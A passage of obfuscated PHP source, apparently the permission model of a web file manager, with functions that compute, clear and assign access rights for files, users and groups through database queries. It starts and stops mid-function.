$ÉÆÉ®İô)) { } } if ($™¡íêªí[$ñù¸°Éù[580]] == 0) { $™¡íêªí[$ñù¸°Éù[190]] = SourceModel::TYPE_USER; } $¶‡ÓÌ¯¡[] = array($ñù¸°Éù[193] => $¥çŒüë“, $ñù¸°Éù[190] => intval($™¡íêªí[$ñù¸°Éù[190]]), $ñù¸°Éù[580] => intval($™¡íêªí[$ñù¸°Éù[580]]), $ñù¸°Éù[2082] => intval($™¡íêªí[$ñù¸°Éù[2082]]) ? intval($™¡íêªí[$ñù¸°Éù[2082]]) : 0, $ñù¸°Éù[2143] => intval($™¡íêªí[$ñù¸°Éù[2143]]) ? intval($™¡íêªí[$ñù¸°Éù[2143]]) : -1); } $this->where(array($ñù¸°Éù[502] => $¥çŒüë“))->delete(); $this->addAll($¶‡ÓÌ¯¡); return !0; } public function authClear($ÛĞ¸ÁÄÚ) { $œ´”ò =& $_SERVER[´È¥ö†ö]; $ªÀùÀè = Model($œ´”ò[1420])->sourceInfo($ÛĞ¸ÁÄÚ); $Îõ´½„  = array($ÛĞ¸ÁÄÚ); if ($ªÀùÀè[$œ´”ò[496]] == $œ´”ò[91]) { $¢œÜåë¡ = array($œ´”ò[666] => array($œ´”ò[626], $ªÀùÀè[$œ´”ò[595]] . $ÛĞ¸ÁÄÚ . $œ´”ò[627])); $Îõ´½„  = Model($œ´”ò[1420])->field($œ´”ò[502])->where($¢œÜåë¡)->getField($œ´”ò[193], !0); $Îõ´½„ [] = $ÛĞ¸ÁÄÚ; } $this->where(array($œ´”ò[502] => array($œ´”ò[503], $Îõ´½„ )))->delete(); return !0; } public function getAllChildren($¼Ö…ûˆ€) { $’¿ŞùÃ½ =& $_SERVER[´È¥ö†ö]; $ÎÁĞÁ˜« = Model($’¿ŞùÃ½[1420])->sourceInfo($¼Ö…ûˆ€); if ($ÎÁĞÁ˜«[$’¿ŞùÃ½[496]] != $’¿ŞùÃ½[91]) { return $this->sourceListAuth(array($¼Ö…ûˆ€)); } if ($ÎÁĞÁ˜«[$’¿ŞùÃ½[190]] != SourceModel::TYPE_GROUP) { return array(); } $Àª£ıæÜ = 1; $Ó«¶…í¹ = array($¼Ö…ûˆ€); if ($ÎÁĞÁ˜«[$’¿ŞùÃ½[192]] == $’¿ŞùÃ½[230] && $ÎÁĞÁ˜«[$’¿ŞùÃ½[580]] != $Àª£ıæÜ) { $Ó«¶…í¹ = $this->groupChidldAllRootSource($ÎÁĞÁ˜«[$’¿ŞùÃ½[580]]); } $ÙÃŞ´õÛ = $this->field($’¿ŞùÃ½[193])->group($’¿ŞùÃ½[193])->select(); $ÙÃŞ´õÛ = array_to_keyvalue($ÙÃŞ´õÛ, $’¿ŞùÃ½[12], $’¿ŞùÃ½[193]); if (!$ÙÃŞ´õÛ) { return array(); } $Æ¥…ÆÅ¥ = $’¿ŞùÃ½[2162]; $ïùìˆ¤ = array($’¿ŞùÃ½[193] => array($’¿ŞùÃ½[7], $ÙÃŞ´õÛ), $’¿ŞùÃ½[516] => $’¿ŞùÃ½[230]); $ÕÍ­“’Í = Model($’¿ŞùÃ½[901])->field($Æ¥…ÆÅ¥)->where($ïùìˆ¤)->select(); $¤¢Õş±Á = array($¼Ö…ûˆ€); foreach ($ÕÍ­“’Í as $¾³—‰›¯) { foreach ($Ó«¶…í¹ as $œÔ”½ö) { $“İíğˆ® = $’¿ŞùÃ½[50] . $œÔ”½ö . $’¿ŞùÃ½[50]; $¦•ˆ = $¾³—‰›¯[$’¿ŞùÃ½[595]] . $¾³—‰›¯[$’¿ŞùÃ½[193]] . $’¿ŞùÃ½[50]; if (strstr($¦•ˆ, $“İíğˆ®)) { $¤¢Õş±Á[] = $¾³—‰›¯[$’¿ŞùÃ½[193]]; break; } } } return $this->sourceListAuth($¤¢Õş±Á); } private function sourceListAuth($¦ßµ³÷) { $İ€¿Â× =& $_SERVER[´È¥ö†ö]; $ÍÆÒˆûò = Model($İ€¿Â×[1420])->sourceListInfo($¦ßµ³÷, !0); $ùàˆ‹°µ = $this->sourceAuthSelect($¦ßµ³÷); $íóÂÑ–Æ = array(); $ü¡ÙŞé = array(); foreach ($ÍÆÒˆûò as $¶å§‹•) { unset($¶å§‹•[$İ€¿Â×[540]]); unset($¶å§‹•[$İ€¿Â×[538]]); unset($¶å§‹•[$İ€¿Â×[498]]); unset($¶å§‹•[$İ€¿Â×[90]]); $¥İ£òö¡ = $ùàˆ‹°µ[$¶å§‹•[$İ€¿Â×[193]]]; if (!$¥İ£òö¡) { continue; } $¶å§‹•[$İ€¿Â×[2163]] = $this->authTargetInfo($¥İ£òö¡); $¶å§‹•[$İ€¿Â×[593]] = rtrim($¶å§‹•[$İ€¿Â×[599]], $İ€¿Â×[8]) . $İ€¿Â×[8] . ltrim($¶å§‹•[$İ€¿Â×[593]], $İ€¿Â×[8]); $íóÂÑ–Æ[] = $¶å§‹•; $—ıÁËµÖ = count(explode($İ€¿Â×[8], trim($¶å§‹•[$İ€¿Â×[593]], $İ€¿Â×[8]))); $ü¡ÙŞé[] = $—ıÁËµÖ + ($¶å§‹•[$İ€¿Â×[33]] == $İ€¿Â×[78] ? 0 : 1000); } array_multisort($ü¡ÙŞé, SORT_ASC, $íóÂÑ–Æ); return $íóÂÑ–Æ; } private function groupChidldAllRootSource($æé¶İ¾Ô) { $ÍÚš´» =& $_SERVER[´È¥ö†ö]; $½ƒ÷ = Model($ÍÚš´»[2164])->groupChildrenAll($æé¶İ¾Ô); $¢üüËÌğ = array($ÍÚš´»[192] => 0, $ÍÚš´»[580] => array($ÍÚš´»[7], $½ƒ÷), $ÍÚš´»[190] => SourceModel::TYPE_GROUP); $¾ñ¯–áÛ = Model($ÍÚš´»[901])->field($ÍÚš´»[193])->where($¢üüËÌğ)->select(); $¾ñ¯–áÛ = array_to_keyvalue($¾ñ¯–áÛ, $ÍÚš´»[12], $ÍÚš´»[193]); return $¾ñ¯–áÛ; } private function authTargetInfo($‘«ôæ£) { $œ¢‹ûÎ =& $_SERVER[´È¥ö†ö]; $¼³ãÛ¤Í = array(); $ìæÑè™¥ = array(); $¤˜™å€Ã = 2 << 25; foreach ($‘«ôæ£ as $×Ÿ¾Æ»ù) { $”–‚ÇâÁ = Model($œ¢‹ûÎ[582])->listData($×Ÿ¾Æ»ù[$œ¢‹ûÎ[2082]]); if (!$”–‚ÇâÁ) { continue; } if ($×Ÿ¾Æ»ù[$œ¢‹ûÎ[190]] == SourceModel::TYPE_USER) { $üÔİÅñÀ = Model($œ¢‹ûÎ[588])->getInfoSimpleOuter($×Ÿ¾Æ»ù[$œ¢‹ûÎ[580]]); if ($üÔİÅñÀ[$œ¢‹ûÎ[1773]] == $œ¢‹ûÎ[1272]) { continue; } if ($üÔİÅñÀ[$œ¢‹ûÎ[1773]] == $œ¢‹ûÎ[230]) { $üÔİÅñÀ[$œ¢‹ûÎ[32]] = LNG($œ¢‹ûÎ[2165]); } } else { $üÔİÅñÀ = Model($œ¢‹ûÎ[596])->getInfoSimple($×Ÿ¾Æ»ù[$œ¢‹ûÎ[580]]); } if (!$üÔİÅñÀ) { continue; } $üÔİÅñÀ[$œ¢‹ûÎ[551]] = $”–‚ÇâÁ; $¼³ãÛ¤Í[] = $üÔİÅñÀ; $ó‚áÖ‘ƒ = 0; if ($×Ÿ¾Æ»ù[$œ¢‹ûÎ[190]] == SourceModel::TYPE_GROUP) { $ó‚áÖ‘ƒ = $¤˜™å€Ã * 2; } if ($×Ÿ¾Æ»ù[$œ¢‹ûÎ[190]] == SourceModel::TYPE_USER) { $ó‚áÖ‘ƒ = $¤˜™å€Ã; } if ($×Ÿ¾Æ»ù[$œ¢‹ûÎ[190]] == SourceModel::TYPE_USER && $×Ÿ¾Æ»ù[$œ¢‹ûÎ[580]] == $œ¢‹ûÎ[230]) { $ó‚áÖ‘ƒ = 0; } $ìæÑè™¥[] = $”–‚ÇâÁ[$œ¢‹ûÎ[498]] + $ó‚áÖ‘ƒ; } array_multisort($ìæÑè™¥, SORT_DESC, $¼³ãÛ¤Í); return $¼³ãÛ¤Í; } public function getAllChildrenByUser($©ôß¢Ö, $ò²Ñ¤‹è) { $íÂÎ´èç =& $_SERVER[´È¥ö†ö]; $£ç½×äÆ = Model($íÂÎ´èç[608])->getInfo($ò²Ñ¤‹è); if (!$ò²Ñ¤‹è || !$©ôß¢Ö || !$£ç½×äÆ) { return array(); } $ƒ‹ó¨¶Ğ = Model($íÂÎ´èç[1420])->sourceInfo($©ôß¢Ö); $û¼Û›¢¡ = array(); $®åæ…³© = 1; if ($ƒ‹ó¨¶Ğ[$íÂÎ´èç[192]] == $íÂÎ´èç[230] && $ƒ‹ó¨¶Ğ[$íÂÎ´èç[580]] != $®åæ…³© && $this->groupContainUser($ƒ‹ó¨¶Ğ[$íÂÎ´èç[580]], $ò²Ñ¤‹è)) { foreach ($£ç½×äÆ[$íÂÎ´èç[2166]] as $Ù‡Ññ¶œ) { $ï‰´£Òó = Model($íÂÎ´èç[596])->getInfo($Ù‡Ññ¶œ[$íÂÎ´èç[1974]]); $‚§Ãğùğ = Model($íÂÎ´èç[608])->getInfoSimpleOuter($ò²Ñ¤‹è); $‚§Ãğùğ[$íÂÎ´èç[551]] = $Ù‡Ññ¶œ[$íÂÎ´èç[498]]; if (Model($íÂÎ´èç[582])->authCheckAction($Ù‡Ññ¶œ[$íÂÎ´èç[498]][$íÂÎ´èç[498]], $íÂÎ´èç[1995])) { continue; } $Â„È‹Ô = array($íÂÎ´èç[32] => $íÂÎ´èç[1292] . $ï‰´£Òó[$íÂÎ´èç[32]], $íÂÎ´èç[193] => $ï‰´£Òó[$íÂÎ´èç[90]][$íÂÎ´èç[193]], $íÂÎ´èç[87] => KodIO::make($ï‰´£Òó[$íÂÎ´èç[90]][$íÂÎ´èç[193]]), $íÂÎ´èç[192] => $íÂÎ´èç[230], $íÂÎ´èç[190] => $íÂÎ´èç[589], $íÂÎ´èç[33] => $íÂÎ´èç[630], $íÂÎ´èç[593] => $ï‰´£Òó[$íÂÎ´èç[600]], $íÂÎ´èç[1974] => $ï‰´£Òó[$íÂÎ´èç[1974]], $íÂÎ´èç[597] => $ï‰´£Òó[$íÂÎ´èç[192]], $íÂÎ´èç[2163] => array($‚§Ãğùğ)); $û¼Û›¢¡[$Â„È‹Ô[$íÂÎ´èç[193]]] = $Â„È‹Ô; } } $Ä­¸©§™ = array(); $ûì¥öş = $this->getAllChildren($©ôß¢Ö); foreach ($ûì¥öş as $Û¶­™’â) { $ÄüóÕ¦õ = !1; foreach ($Û¶­™’â[$íÂÎ´èç[2163]] as $èœÖçÍÀ) { if ($èœÖçÍÀ[$íÂÎ´èç[1773]]) { if ($èœÖçÍÀ[$íÂÎ´èç[1773]] == $ò²Ñ¤‹è) { $ÄüóÕ¦õ = !0; break; } } if ($èœÖçÍÀ[$íÂÎ´èç[1974]]) { if ($this->groupContainUser($èœÖçÍÀ[$íÂÎ´èç[1974]], $ò²Ñ¤‹è)) { $ÄüóÕ¦õ = !0; break; } } } if ($ÄüóÕ¦õ) { $Ä­¸©§™[] = $Û¶­™’â; } $†ù©ä‹ú = $Û¶­™’â[$íÂÎ´èç[193]]; if (isset($û¼Û›¢¡[$†ù©ä‹ú])) { $Û¶­™’â[$íÂÎ´èç[2163]][] = $û¼Û›¢¡[$†ù©ä‹ú][0]; $û¼Û›¢¡[$†ù©ä‹ú] = !1; } } $û¼Û›¢¡ = array_filter(array_values($û¼Û›¢¡)); $Ä­¸©§™ = array_merge($û¼Û›¢¡, $Ä­¸©§™); return $Ä­¸©§™; } public function setAllChildrenByUser($ÙÉó£ğ•, $Íä ‡î±, $ÎáœÄ§ß) { $ÀÇÅˆØ =& $_SERVER[´È¥ö†ö]; $µğæşèç = $this->getAllChildrenByUser($ÙÉó£ğ•, $Íä ‡î±); if (!$ÎáœÄ§ß || !$µğæşèç) { return !1; } foreach ($µğæşèç as $œÂ—¾«·) { $¤ŸÈ©Ïõ = array(); foreach ($œÂ—¾«·[$ÀÇÅˆØ[2163]] as $ÒÖÁòÖş) { $™¬ÙœÆÊ = $ÒÖÁòÖş[$ÀÇÅˆØ[551]]; $Ãº²×™ƒ = $ÒÖÁòÖş[$ÀÇÅˆØ[1773]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $üæ®†âÑ = $ÒÖÁòÖş[$ÀÇÅˆØ[1773]] ? $ÒÖÁòÖş[$ÀÇÅˆØ[1773]] : $ÒÖÁòÖş[$ÀÇÅˆØ[1974]]; if ($ÒÖÁòÖş[$ÀÇÅˆØ[1773]] && $ÒÖÁòÖş[$ÀÇÅˆØ[1773]] == $Íä ‡î±) { continue; } $¤ŸÈ©Ïõ[] = array($ÀÇÅˆØ[193] => $œÂ—¾«·[$ÀÇÅˆØ[193]], $ÀÇÅˆØ[190] => $Ãº²×™ƒ, $ÀÇÅˆØ[580] => intval($üæ®†âÑ), $ÀÇÅˆØ[2082] => isset($™¬ÙœÆÊ[$ÀÇÅˆØ[486]]) ? intval($™¬ÙœÆÊ[$ÀÇÅˆØ[486]]) : 0, $ÀÇÅˆØ[2143] => isset($™¬ÙœÆÊ[$ÀÇÅˆØ[2143]]) ? intval($™¬ÙœÆÊ[$ÀÇÅˆØ[2143]]) : -1); } $¤ŸÈ©Ïõ[] = array($ÀÇÅˆØ[193] => $œÂ—¾«·[$ÀÇÅˆØ[193]], $ÀÇÅˆØ[190] => SourceModel::TYPE_USER, $ÀÇÅˆØ[580] => intval($Íä ‡î±), $ÀÇÅˆØ[2082] => intval($ÎáœÄ§ß), $ÀÇÅˆØ[2143] => -1); $this->where(array($ÀÇÅˆØ[502] => $œÂ—¾«·[$ÀÇÅˆØ[193]]))->delete(); $this->addAll($¤ŸÈ©Ïõ); } return !0; } public function get($­²œ Ì) { $âĞÚËÀÆ = $this->getSourceList(array($­²œ Ì), !0); return $âĞÚËÀÆ[0]; } public function getSourceList($¬¹ÄöÔĞ, $¤Øæ¸Ïü = false, $Ì‚›úÀ = false) { $†øšÏñğ =& $_SERVER[´È¥ö†ö]; if (!$¬¹ÄöÔĞ) { return array(); } $ì©³ú¿‹ = Model($†øšÏñğ[1420]); if (!$¤Øæ¸Ïü && count($¬¹ÄöÔĞ) == 1) { $¤Øæ¸Ïü = array(); $¤Øæ¸Ïü[$¬¹ÄöÔĞ[0]] = $ì©³ú¿‹->sourceInfo($¬¹ÄöÔĞ[0]); } if (!$¤Øæ¸Ïü) { $œÁ¸ì³ª = array($†øšÏñğ[502] => array($†øšÏñğ[503], $¬¹ÄöÔĞ)); $¤Øæ¸Ïü = $ì©³ú¿‹->field($†øšÏñğ[2167])->where($œÁ¸ì³ª)->select(); $¤Øæ¸Ïü = array_to_keyvalue($¤Øæ¸Ïü, $†øšÏñğ[193]); } $œÍÈ¾ÜŸ = $¬¹ÄöÔĞ; foreach ($¤Øæ¸Ïü as $Íé´ÍŒ½ => $ü…Ù¹õÇ) { $¥©çƒ²· = $ì©³ú¿‹->parentLevelArray($ü…Ù¹õÇ[$†øšÏñğ[595]]); $œÍÈ¾ÜŸ = array_merge($œÍÈ¾ÜŸ, array($Íé´ÍŒ½), array_reverse($¥©çƒ²·)); } $œÍÈ¾ÜŸ = array_values(array_unique($œÍÈ¾ÜŸ)); if (!$œÍÈ¾ÜŸ) { return array(); } $ùÎ·­Ê = $this->sourceAuthSelect($œÍÈ¾ÜŸ); $…é§¬½± = array(); foreach ($œÍÈ¾ÜŸ as $’‚¾ÅË) { if (isset($ùÎ·­Ê[$’‚¾ÅË])) { $…é§¬½±[$’‚¾ÅË] = $ùÎ·­Ê[$’‚¾ÅË]; } } $ÄÛˆ³¬Î = $this->userIsRoot($Ì‚›úÀ); $óÌÅÀ = AuthModel::authAll(); $Á¬şğ¤– = array($†øšÏñğ[499] => $óÌÅÀ, $†øšÏñğ[2168] => array($†øšÏñğ[504] => 0, $†øšÏñğ[1980] => $óÌÅÀ, $†øšÏñğ[505] => LNG($†øšÏñğ[2169]), $†øšÏñğ[1997] => $†øšÏñğ[2170])); $Áå¯ëúé = array(); foreach ($¤Øæ¸Ïü as $’‚¾ÅË => $·Èùıë©) { if ($ÄÛˆ³¬Î && $GLOBALS[$†øšÏñğ[6]][$†øšÏñğ[1993]]) { $Áå¯ëúé[$’‚¾ÅË] = $Á¬şğ¤–; continue; } $Áå¯ëúé[$’‚¾ÅË] = $this->makeSourceAuth($·Èùıë©, $…é§¬½±, $Ì‚›úÀ); } return $Áå¯ëúé; } public function authDeepCheck($À»á°ğ¤, $Ñç†ì› = false) { $ª”Œ±øû =& $_SERVER[´È¥ö†ö]; $Ñç†ì› = $Ñç†ì› ? $Ñç†ì› : USER_ID; $É€û¦Å = $this->makeAuthDeep($Ñç†ì›); if (!in_array($À»á°ğ¤, $É€û¦Å[$ª”Œ±øû[2171]])) { return !1; } $á°æ«îƒ = array(); foreach ($É€û¦Å[$ª”Œ±øû[2172]] as $Ãˆœ»È“ => $õŞÔ©¼£) { if (!in_array($À»á°ğ¤, $õŞÔ©¼£)) { continue; } $á°æ«îƒ[] = $Ãˆœ»È“; } if (!$á°æ«îƒ) { return !1; } $¹º˜€¦² = $á°æ«îƒ ? $á°æ«îƒ[0] : $À»á°ğ¤; return array($ª”Œ±øû[499] => -1, $ª”Œ±øû[551] => array($ª”Œ±øû[504] => $ª”Œ±øû[1272], $ª”Œ±øû[1980] => $ª”Œ±øû[230], $ª”Œ±øû[505] => LNG($ª”Œ±øû[2173]), $ª”Œ±øû[1997] => $ª”Œ±øû[2174]), $ª”Œ±øû[2175] => LNG($ª”Œ±øû[2176]), $ª”Œ±øû[2177] => $this->sourceAuthInfo($¹º˜€¦²)); } protected function makeAuthDeep($‰èë‘‘ = false) { $±±“úğŠ =& $_SERVER[´È¥ö†ö]; static $¤¿¦šâí = array(); $‰èë‘‘ = $‰èë‘‘ ? $‰èë‘‘ : USER_ID; if (isset($¤¿¦šâí[$‰èë‘‘])) { return $¤¿¦šâí[$‰èë‘‘]; } $Áè¶Á˜Ï = Model($±±“úğŠ[2178])->listData(); $ò¦ÔÏíç = array(); foreach ($Áè¶Á˜Ï as $€·Şû…) { if ($€·Şû…[$±±“úğŠ[498]] == 0 && $€·Şû…[$±±“úğŠ[1996]] == $±±“úğŠ[91]) { $ò¦ÔÏíç[] = $€·Şû…[$±±“úğŠ[486]]; } } $Ë‹¬‡Ñç = $this->userGroupParents($‰èë‘‘); $ÖÑÇÄı” = array($±±“úğŠ[190] => SourceModel::TYPE_USER, $±±“úğŠ[580] => $‰èë‘‘); if ($Ë‹¬‡Ñç) { $ÖÑÇÄı” = array(array($±±“úğŠ[190] => SourceModel::TYPE_USER, $±±“úğŠ[580] => $‰èë‘‘), array($±±“úğŠ[190] => SourceModel::TYPE_GROUP, $±±“úğŠ[580] => array($±±“úğŠ[503], $Ë‹¬‡Ñç)), $±±“úğŠ[1076] => $±±“úğŠ[2076]); } $úµ‰ôá = $this->field($±±“úğŠ[2179])->where($ÖÑÇÄı”)->select(); $Á¾¸ï³Ğ = array(); $€ßÖß¤› = array_to_keyvalue_group($úµ‰ôá, $±±“úğŠ[193]); foreach ($€ßÖß¤› as $„Œğ­«ñ => $Õ‹³ÂˆÀ) { $®…‡¢ß = $this->authArrayCheck($Õ‹³ÂˆÀ, $‰èë‘‘); if ($®…‡¢ß[$±±“úğŠ[499]] > 0) { $Á¾¸ï³Ğ[] = $„Œğ­«ñ . $±±“úğŠ[12]; } } if ($Ë‹¬‡Ñç) { $†ñ­ø‚ = Model($±±“úğŠ[596]); foreach ($Ë‹¬‡Ñç as $”ú«óŸ‹) { $Şúİ°› = $†ñ­ø‚->getInfo($”ú«óŸ‹); if (!$Şúİ°› || !is_array($Şúİ°›[$±±“úğŠ[90]])) { continue; } $Á¾¸ï³Ğ[] = $Şúİ°›[$±±“úğŠ[90]][$±±“úğŠ[193]]; } } $ŸÂî·¦Á = array(); $ÀÈ¸šéå = $Ë‹¬‡Ñç; $†ëÚÚÃ = Model($±±“úğŠ[1420]); $†ñ­ø‚ = Model($±±“úğŠ[596]); $•ÓÙšŠô = array(); $’¿™ İ¯ = array(); $ÖÔê˜¦ì = array(); $¿Û·³—š = array(); if ($Á¾¸ï³Ğ) { $»µµö¶ñ = $†ëÚÚÃ->where(array($±±“úğŠ[193] => array($±±“úğŠ[503], $Á¾¸ï³Ğ)))->select(); foreach ($»µµö¶ñ as $™ÌİÜ³Ş) { if ($™ÌİÜ³Ş[$±±“úğŠ[516]] == $±±“úğŠ[91]) { continue; } $âĞÅ¸õã = $†ëÚÚÃ->parentLevelArray($™ÌİÜ³Ş[$±±“úğŠ[595]]); $ŸÂî·¦Á = array_merge($ŸÂî·¦Á, $âĞÅ¸õã); $ÀÈ¸šéå[] = $™ÌİÜ³Ş[$±±“úğŠ[580]]; $•ÓÙšŠô[$™ÌİÜ³Ş[$±±“úğŠ[193]]] = $âĞÅ¸õã; $’¿™ İ¯[$™ÌİÜ³Ş[$±±“úğŠ[193]]] = $™ÌİÜ³Ş[$±±“úğŠ[580]]; } } $ÀÈ¸šéå = array_values(array_unique($ÀÈ¸šéå)); $€áˆÓ×© = $ÀÈ¸šéå; foreach ($€áˆÓ×© as $”ú«óŸ‹) { $Şúİ°› = $†ñ­ø‚->getInfo($”ú«óŸ‹); $âĞÅ¸õã = $†ëÚÚÃ->parentLevelArray($Şúİ°›[$±±“úğŠ[595]]); $ÀÈ¸šéå = array_merge($ÀÈ¸šéå, $âĞÅ¸õã); } $ÀÈ¸šéå = array_values(array_unique($ÀÈ¸šéå)); foreach ($ÀÈ¸šéå as $”ú«óŸ‹) { $Şúİ°› = $†ñ­ø‚->getInfo($”ú«óŸ‹); $ŸÂî·¦Á[] = $Şúİ°›[$±±“úğŠ[90]][$±±“úğŠ[193]]; $ÖÔê˜¦ì[$”ú«óŸ‹] = $Şúİ°›[$±±“úğŠ[90]][$±±“úğŠ[193]]; $¿Û·³—š[$”ú«óŸ‹] = $†ëÚÚÃ->parentLevelArray($Şúİ°›[$±±“úğŠ[595]]); } foreach ($•ÓÙšŠô as $Ä©È†±¶ => $¥¯ãÑ‘õ) { $æÖ††‡æ = $’¿™ İ¯[$Ä©È†±¶]; if (!$æÖ††‡æ || !$ÖÔê˜¦ì[$æÖ††‡æ]) { continue; } $–§èÒïœ = array(); foreach ($¿Û·³—š[$æÖ††‡æ] as $”ú«óŸ‹) { $–§èÒïœ[] = $ÖÔê˜¦ì[$”ú«óŸ‹]; } $•ÓÙšŠô[$Ä©È†±¶] = array_merge($–§èÒïœ, $¥¯ãÑ‘õ); } $ŸÂî·¦Á = array_values(array_unique($ŸÂî·¦Á)); $¬îí»äÛ = array($±±“úğŠ[2171] => $ŸÂî·¦Á, $±±“úğŠ[2172] => $•ÓÙšŠô); $¤¿¦šâí[$‰èë‘‘] = $¬îí»äÛ; return $¬îí»äÛ; } private function makeSourceAuth($ğü¯³¤, $€ä¬àøŠ, $™¹À³‡‹ = false) { $™±øÛëŞ =& $_SERVER[´È¥ö†ö]; $ËÁ¯†¶¿ = $™±øÛëŞ[91]; $ï‰‚€Çû = $ğü¯³¤[$™±øÛëŞ[580]]; $Ç¯»Âù“ = $ğü¯³¤[$™±øÛëŞ[190]] == SourceModel::TYPE_GROUP; $Ÿœ Óé = $Ç¯»Âù“ ? $this->groupRootAuth($ï‰‚€Çû, $™¹À³‡‹) : !1; if ($Ÿœ Óé && Model($™±øÛëŞ[582])->authCheckAction($Ÿœ Óé[$™±øÛëŞ[498]], $™±øÛëŞ[1995])) { return $this->groupAuthInfo($Ÿœ Óé, $ï‰‚€Çû); } $òåÆÄ˜¤ = Model($™±øÛëŞ[1420])->parentLevelArray($ğü¯³¤[$™±øÛëŞ[595]]); $òåÆÄ˜¤ = array_merge(array($ğü¯³¤[$™±øÛëŞ[193]]), array_reverse($òåÆÄ˜¤)); $©‹“¸ÈÈ = !1; foreach ($òåÆÄ˜¤ as $£à›­„Ÿ) { if (!isset($€ä¬àøŠ[$£à›­„Ÿ])) { continue; } $×Ğ¬¸ûá = $this->authMake($€ä¬àøŠ[$£à›­„Ÿ], $™¹À³‡‹); if ($×Ğ¬¸ûá[$™±øÛëŞ[551]]) { $©‹“¸ÈÈ = $×Ğ¬¸ûá; break; } } if (!$Ç¯»Âù“) { return $©‹“¸ÈÈ; } if (!$©‹“¸ÈÈ && $Ÿœ Óé) { $©‹“¸ÈÈ = $this->groupAuthInfo($Ÿœ Óé, $ï‰‚€Çû); } if (!$©‹“¸ÈÈ) { $î—•ê½Â = Model($™±øÛëŞ[596])->getInfo($ï‰‚€Çû); $Ê£¼âíÔ = explode($™±øÛëŞ[50], trim($î—•ê½Â[$™±øÛëŞ[595]], $™±øÛëŞ[50])); $Ê£¼âíÔ = array_reverse($Ê£¼âíÔ); foreach ($Ê£¼âíÔ as $£ŠØ óñ) { if ($£ŠØ óñ == $™±øÛëŞ[230] || $£ŠØ óñ == $ËÁ¯†¶¿) { continue; } $·ş¶‚® = $this->groupRootAuth($£ŠØ óñ, $™¹À³‡‹); if (!$·ş¶‚®) { continue; } $©‹“¸ÈÈ = $this->groupAuthInfo($·ş¶‚®, $£ŠØ óñ); break; } } if (!$©‹“¸ÈÈ || $©‹“¸ÈÈ[$™±øÛëŞ[499]] <= 0) { $ƒÎøÒ¨ï = $this->authDeepCheck($ğü¯³¤[$™±øÛëŞ[193]], $™¹À³‡‹); if ($ƒÎøÒ¨ï) { $©‹“¸ÈÈ = $ƒÎøÒ¨ï; } } return $©‹“¸ÈÈ; } private function userIsRoot($Æî¢İ = false) { $¸ößÑ°§ =& $_SERVER[´È¥ö†ö]; if (!$Æî¢İ && KodUser::isRoot()) { return !0; } $¾šŠ…†ú = Model($¸ößÑ°§[608])->getInfo($Æî¢İ); $á‹Â•Ñ­ = Model($¸ößÑ°§[2180])->listData($¾šŠ…†ú[$¸ößÑ°§[2181]]); if ($á‹Â•Ñ­ && $á‹Â•Ñ­[$¸ößÑ°§[586]][$¸ößÑ°§[2182]] == 1) { return !0; } return !1; } private function sourceAuthInfo($æœ„ÔóÜ) { $©™ãµ§Ã =& $_SERVER[´È¥ö†ö]; $Ï´ˆ»æ´ = Model($©™ãµ§Ã[1420]); $®åÊëÇ = $Ï´ˆ»æ´->sourceInfo($æœ„ÔóÜ); if (!$®åÊëÇ) { return !1; } $Ï´ˆ»æ´->groupPathDisplay($®åÊëÇ); $–ÂšÏŒı = array($®åÊëÇ); $–ÂšÏŒı = $Ï´ˆ»æ´->_listAppendPath($–ÂšÏŒı); $®åÊëÇ = $–ÂšÏŒı[0]; $ÜÍÄ§ğÀ = $®åÊëÇ[$©™ãµ§Ã[593]]; if (isset($®åÊëÇ[$©™ãµ§Ã[601]])) { $µ¡äâƒ… = explode($©™ãµ§Ã[8], trim($®åÊëÇ[$©™ãµ§Ã[593]], $©™ãµ§Ã[8])); array_shift($µ¡äâƒ…); $ÜÍÄ§ğÀ = $®åÊëÇ[$©™ãµ§Ã[599]] . $©™ãµ§Ã[2183] . implode($©™ãµ§Ã[8], $µ¡äâƒ…); } return array($©™ãµ§Ã[505] => $®åÊëÇ[$©™ãµ§Ã[32]], $©™ãµ§Ã[87] => KodIO::make($®åÊëÇ[$©™ãµ§Ã[193]]), $©™ãµ§Ã[2184] => $ÜÍÄ§ğÀ); } private function groupAuthInfo($¨è¤„¤È, $ÎØôİü) { $§ºÛã“ =& $_SERVER[´È¥ö†ö]; $éªÃÆÅ¦ = Model($§ºÛã“[596])->getInfo($ÎØôİü); return array($§ºÛã“[2185] => intval($¨è¤„¤È[$§ºÛã“[498]]), $§ºÛã“[2168] => $¨è¤„¤È, $§ºÛã“[2186] => LNG($§ºÛã“[2187]), $§ºÛã“[2177] => array($§ºÛã“[505] => $éªÃÆÅ¦[$§ºÛã“[32]], $§ºÛã“[87] => KodIO::make($éªÃÆÅ¦[$§ºÛã“[90]][$§ºÛã“[193]]), $§ºÛã“[2184] => $éªÃÆÅ¦[$§ºÛã“[600]])); } protected function groupRootAuth($µöù¸Âò, $‰ğ¨Ë×“ = false) { $¾ÜÍÌì =& $_SERVER[´È¥ö†ö]; $‰ğ¨Ë×“ = $‰ğ¨Ë×“ ? $‰ğ¨Ë×“ : USER_ID; $È®ş‚Ì = $‰ğ¨Ë×“ . $¾ÜÍÌì[2188] . $µöù¸Âò; static $ƒÄ²ËŠö = array(); if (isset($ƒÄ²ËŠö[$È®ş‚Ì])) { return $ƒÄ²ËŠö[$È®ş‚Ì]; } $ø£êÎœ = Model($¾ÜÍÌì[596])->getInfo($µöù¸Âò); $¯¼‘»Å‹ = $this->userGroupList($‰ğ¨Ë×“); $¾¹•îù€ = isset($¯¼‘»Å‹[$µöù¸Âò]) ? $¯¼‘»Å‹[$µöù¸Âò][$¾ÜÍÌì[498]] : !1; if ($¾¹•îù€ && Model($¾ÜÍÌì[582])->authCheckAction($¾¹•îù€[$¾ÜÍÌì[498]], $¾ÜÍÌì[1995])) { $ƒÄ²ËŠö[$È®ş‚Ì] = $¾¹•îù€; return $¾¹•îù€; } $È¬ÆÑ­‹ = $this->sourceAuthSelect($ø£êÎœ[$¾ÜÍÌì[90]][$¾ÜÍÌì[193]]); $«Ç÷Å—Ù = $È¬ÆÑ­‹ ? $this->authMake($È¬ÆÑ­‹, $‰ğ¨Ë×“) : !1; $éÈ‡«èÑ = $«Ç÷Å—Ù ? $«Ç÷Å—Ù[$¾ÜÍÌì[551]] : !1; $ƒÄ²ËŠö[$È®ş‚Ì] = $éÈ‡«èÑ ? $éÈ‡«èÑ : $¾¹•îù€; return $ƒÄ²ËŠö[$È®ş‚Ì]; } public function authOwnerApply($ï´÷Ãü–) { $ä÷±‚˜º =& $_SERVER[´È¥ö†ö]; if 